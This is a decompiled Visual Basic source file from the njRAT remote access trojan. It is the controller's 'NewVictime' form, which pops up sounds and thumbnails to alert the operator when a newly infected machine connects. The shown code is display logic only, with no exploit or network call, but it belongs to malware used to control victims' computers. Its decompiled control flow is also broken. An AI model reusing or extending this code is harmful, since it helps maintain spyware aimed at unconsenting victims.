﻿Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My

Namespace NJRAT
	' Token: 0x02000019 RID: 25
	<DesignerGenerated()>
	Public Partial Class NewVictime
		Inherits Form

		' Token: 0x06000360 RID: 864 RVA: 0x0001D7F0 File Offset: 0x0001B9F0
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = NewVictime.__ENCList
			SyncLock _ENCList
				If NewVictime.__ENCList.Count = NewVictime.__ENCList.Capacity Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = NewVictime.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = NewVictime.__ENCList(num4)
						If weakReference.IsAlive Then
							If num4 <> num Then
								NewVictime.__ENCList(num) = NewVictime.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					NewVictime.__ENCList.RemoveRange(num, NewVictime.__ENCList.Count - num)
					NewVictime.__ENCList.Capacity = NewVictime.__ENCList.Count
				End If
				NewVictime.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000136 RID: 310
		' (get) Token: 0x06000363 RID: 867 RVA: 0x0001DA80 File Offset: 0x0001BC80
		' (set) Token: 0x06000364 RID: 868 RVA: 0x0001DA98 File Offset: 0x0001BC98
		Friend Overridable Property p As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._p
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Dim value2 As EventHandler = AddressOf Me.p_Click
				If Me._p IsNot Nothing Then
					RemoveHandler Me._p.Click, value2
				End If
				Me._p = value
				If Me._p IsNot Nothing Then
					AddHandler Me._p.Click, value2
				End If
			End Set
		End Property

		' Token: 0x06000365 RID: 869 RVA: 0x0001DAF0 File Offset: 0x0001BCF0
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.notf_Load
			NewVictime.__ENCAddToList(Me)
			AddHandler MyBase.Load, AddressOf Me.notf_Load
			Me.bool_0 = True
			Me.Items = New List(Of NewVictime.GClass15)()
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000366 RID: 870 RVA: 0x0001DB48 File Offset: 0x0001BD48
		Public Sub AddItem(img As Bitmap, Text As String)
			If Class7.class8_0.bool_9 Then
				MyProject.Computer.Audio.Play("Stubs/Sound/Sound.wav", AudioPlayMode.Background)
			End If
			Dim items As List(Of NewVictime.GClass15) = Me.Items
			Dim obj As List(Of NewVictime.GClass15) = items
			SyncLock obj
				If Me.Items.Count > 50 Then
					Me.Items.RemoveAt(0)
				End If
				Dim item As NewVictime.GClass15 = New NewVictime.GClass15() With { .bitmap_0 = CType(img.Clone(), Bitmap), .string_0 = Text }
				Me.Items.Add(item)
			End SyncLock
		End Sub

		' Token: 0x06000367 RID: 871 RVA: 0x0001DBE8 File Offset: 0x0001BDE8
		Public Sub back()
			Me.bool_0 = True
			Dim workingArea As Rectangle = Screen.PrimaryScreen.WorkingArea
			Me.Left = workingArea.Width - Me.Width - 5
			Me.Top = workingArea.Height - Me.Height - 5
		End Sub

		' Token: 0x06000368 RID: 872 RVA: 0x0001DC34 File Offset: 0x0001BE34
		Public Sub go()
			Me.bool_0 = False
			Dim workingArea As Rectangle = Screen.PrimaryScreen.WorkingArea
			Me.Left = workingArea.Width
			Me.Top = workingArea.Height
		End Sub

		' Token: 0x06000369 RID: 873 RVA: 0x0001DC70 File Offset: 0x0001BE70
		Private Sub p_Click(sender As Object, e As EventArgs)
			Dim items As List(Of NewVictime.GClass15) = Me.Items
			Dim obj As List(Of NewVictime.GClass15) = items
			SyncLock obj
				Me.Items.Clear()
			End SyncLock
		End Sub

		' Token: 0x0600036A RID: 874 RVA: 0x0001DCB0 File Offset: 0x0001BEB0
		Private Sub notf_Load(sender As Object, e As EventArgs)
			Me.p.BackColor = Color.Pink
			Me.TransparencyKey = Color.Pink
			Me.back()
			Control.CheckForIllegalCrossThreadCalls = False
			Dim thread As Thread = AddressOf Me.wrk
			thread.Start()
		End Sub

		' Token: 0x0600036B RID: 875 RVA: 0x0001DD00 File Offset: 0x0001BF00
		Public Sub wrk()
			While True
				Thread.Sleep(50)
				If Me.Items.Count <> 0 Then
					Try
						Dim bitmap As Bitmap = New Bitmap(Me.p.Width, Me.p.Height)
						Dim graphics As Graphics = Graphics.FromImage(bitmap)
						graphics.Clear(Me.p.BackColor)
						Dim items As List(Of NewVictime.GClass15) = Me.Items
						Dim obj As List(Of NewVictime.GClass15) = items
						SyncLock obj
							Try
								For Each gclass As NewVictime.GClass15 In Me.Items
									If gclass.int_0 <= 2 Then
										gclass.int_0 = 2
										Dim gclass2 As NewVictime.GClass15 = gclass
										Dim gclass3 As NewVictime.GClass15 = gclass2
										gclass3.int_1 += 1
									Else
										Dim count As Integer = Me.Items.Count
										If count > 30 Then
											gclass.int_0 = 2
										ElseIf count > 20 Then
											Dim gclass2 As NewVictime.GClass15 = gclass
											gclass2.int_0 += -20
										ElseIf count > 10 Then
											Dim gclass2 As NewVictime.GClass15 = gclass
											gclass2.int_0 += -10
										Else
											Dim gclass2 As NewVictime.GClass15 = gclass
											gclass2.int_0 += -2
										End If
										If gclass.int_0 < 2 Then
											gclass.int_0 = 2
										End If
									End If
									Dim size As Size = TextRenderer.MeasureText(gclass.string_0, Me.Font)
									size.Width = bitmap.Width
									size.Height += 5
									Dim rectangle As Rectangle = New Rectangle(0, gclass.int_0 - 2, Me.Width, size.Height)
									graphics.FillRectangle(Brushes.Black, rectangle)
									rectangle = New Rectangle(0, gclass.int_0 - 2, Me.Width, size.Height)
									ControlPaint.DrawLockedFrame(graphics, rectangle, False)
									Dim array As Object() = New Object(1) {}
									array(0) = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(gclass.bitmap_0.Clone())))
									Dim point As Point = New Point(5, gclass.int_0 - 2)
									array(1) = point
									NewLateBinding.LateCall(graphics, Nothing, "DrawImage", array, Nothing, Nothing, Nothing, True)
									graphics.DrawString(gclass.string_0, Me.Font, Brushes.Aqua, 5F, CSng(gclass.int_0))
									If gclass.int_0 > Me.Height - 50 Then
										Exit For
									End If
								Next
							Finally
								Dim enumerator As List(Of NewVictime.GClass15).Enumerator
								CType(enumerator, IDisposable).Dispose()
							End Try
							Try
								IL_24E:
								For Each gclass4 As NewVictime.GClass15 In Me.Items
									If gclass4.int_1 = 40 Then
										Me.Items.Remove(gclass4)
										GoTo IL_29C
									End If
								Next
								GoTo IL_29F
							Finally
								Dim enumerator2 As List(Of NewVictime.GClass15).Enumerator
								CType(enumerator2, IDisposable).Dispose()
							End Try
							GoTo IL_29C
							IL_29F:
							If Me.Items.Count = 0 And Me.bool_0 Then
								Me.go()
							End If
							If Me.Items.Count > 0 And Not Me.bool_0 Then
								Me.back()
							End If
							GoTo IL_2E5
							IL_29C:
							GoTo IL_24E
						End SyncLock
						IL_2E5:
						graphics.Flush(FlushIntention.Sync)
						graphics.Dispose()
						Me.p.Image = bitmap
						Continue For
					Catch ex As Exception
						Continue For
					End Try
				End If
				Me.go()
			End While
		End Sub

		' Token: 0x04000197 RID: 407
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000199 RID: 409
		<AccessedThroughProperty("p")>
		Private _p As PictureBox

		' Token: 0x0400019A RID: 410
		Private bool_0 As Boolean

		' Token: 0x0400019B RID: 411
		Public Items As List(Of NewVictime.GClass15)

		' Token: 0x0200001A RID: 26
		Public NotInheritable Class GClass15
			' Token: 0x0600036C RID: 876 RVA: 0x00003072 File Offset: 0x00001272
			Public Sub New()
				Me.int_0 = MyProject.Forms.NewVictime.Height
				Me.int_1 = 0
			End Sub

			' Token: 0x0400019C RID: 412
			Public bitmap_0 As Bitmap

			' Token: 0x0400019D RID: 413
			Public int_0 As Integer

			' Token: 0x0400019E RID: 414
			Public int_1 As Integer

			' Token: 0x0400019F RID: 415
			Public string_0 As String
		End Class
	End Class
End Namespace
